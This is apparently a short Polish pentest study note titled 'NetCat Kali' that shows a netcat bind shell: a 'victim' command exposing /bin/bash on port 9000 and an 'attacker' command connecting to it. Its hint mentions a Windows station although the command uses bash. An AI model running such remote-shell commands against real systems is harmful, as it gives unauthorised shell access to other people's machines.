---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# NetCat Kali

{% hint style="info" %}
To stacja z Windowsem nasłuchuje, a atakujący się tam podłącza
{% endhint %}

ofiara

```
nc -nlvp 9000 -e /bin/bash
```

atakujący

```
nc 127.0.0.1 9000
```
